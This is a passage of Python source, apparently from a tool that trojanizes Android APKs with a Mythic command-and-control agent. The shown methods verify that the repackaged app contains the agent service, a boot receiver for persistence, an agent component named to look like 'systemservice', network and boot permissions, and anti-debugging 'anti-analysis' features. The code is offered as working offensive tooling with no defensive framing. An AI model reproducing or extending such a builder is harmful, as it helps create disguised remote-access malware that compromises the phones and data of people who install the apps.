                required_files = ['AndroidManifest.xml', 'classes.dex']
                
                for req_file in required_files:
                    if req_file not in apk_zip.namelist():
                        print(f"[!] Missing required file: {req_file}")
                        return False
                
                return True
        except Exception as e:
            print(f"[!] APK structure verification failed: {e}")
            return False
    
    def _verify_manifest_integrity(self) -> bool:
        """Verify manifest integrity"""
        try:
            manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
            if not os.path.exists(manifest_path):
                return False
            
            tree = ET.parse(manifest_path)
            root = tree.getroot()
            

            services = root.findall(".//service")
            agent_service_found = any(
                'MythicAgentService' in service.get(f'{self.namespace}name', '')
                for service in services
            )
            

            receivers = root.findall(".//receiver")
            boot_receiver_found = any(
                'BootReceiver' in receiver.get(f'{self.namespace}name', '')
                for receiver in receivers
            )
            
            return agent_service_found and boot_receiver_found
            
        except Exception as e:
            print(f"[!] Manifest verification failed: {e}")
            return False
    
    def _verify_dex_integrity(self, apk_path: str) -> bool:
        """Verify DEX file integrity"""
        try:
            with zipfile.ZipFile(apk_path, 'r') as apk_zip:
                dex_data = apk_zip.read('classes.dex')
                

                if len(dex_data) < 112:
                    return False
                

                magic = dex_data[:8]
                if not magic.startswith(b'dex\n'):
                    return False
                
                return True
        except Exception as e:
            print(f"[!] DEX verification failed: {e}")
            return False
    
    def _verify_signature(self, apk_path: str) -> bool:
        """Verify APK signature"""
        try:
            cmd = ["jarsigner", "-verify", apk_path]
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.returncode == 0
        except Exception as e:
            print(f"[!] Signature verification failed: {e}")
            return False
    
    def _verify_agent_components(self, apk_path: str) -> bool:
        """Verify agent components are present"""
        try:
            with zipfile.ZipFile(apk_path, 'r') as apk_zip:
                files = apk_zip.namelist()
                

                agent_indicators = [
                    'MythicAgent', 'CoreAgent', 'systemservice'
                ]
                
                for indicator in agent_indicators:
                    if any(indicator in f for f in files):
                        return True
                
                return False
        except Exception as e:
            print(f"[!] Agent component verification failed: {e}")
            return False
    
    def _verify_permissions_complete(self, apk_path: str) -> bool:
        """Verify all required permissions are present"""
        try:
            cmd = [f"{self.build_tools}/aapt2", "dump", "permissions", apk_path]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                return False
            
            permissions_text = result.stdout
            

            required_perms = [
                'android.permission.INTERNET',
                'android.permission.FOREGROUND_SERVICE',
                'android.permission.RECEIVE_BOOT_COMPLETED'
            ]
            
            for perm in required_perms:
                if perm not in permissions_text:
                    print(f"[!] Missing required permission: {perm}")
                    return False
            
            return True
        except Exception as e:
            print(f"[!] Permission verification failed: {e}")
            return False
    
    def _verify_resource_integrity(self, apk_path: str) -> bool:
        """Verify resource integrity"""
        try:
            with zipfile.ZipFile(apk_path, 'r') as apk_zip:

                if 'resources.arsc' not in apk_zip.namelist():
                    return False
                

                res_files = [f for f in apk_zip.namelist() if f.startswith('res/')]
                return len(res_files) > 0
        except Exception as e:
            print(f"[!] Resource verification failed: {e}")
            return False
    
    def _verify_anti_analysis_features(self, apk_path: str) -> bool:
        """Verify anti-analysis features are present"""
        try:


            with zipfile.ZipFile(apk_path, 'r') as apk_zip:
                dex_data = apk_zip.read('classes.dex')
                

                obfuscation_indicators = [
                    b'Debug', b'isDebuggerConnected', b'sdk'
                ]
                
                for indicator in obfuscation_indicators:
                    if indicator in dex_data:
                        return True
                
                return False
        except Exception as e:
            print(f"[!] Anti-analysis verification failed: {e}")
            return False

if __name__ == "__main__":
    main()
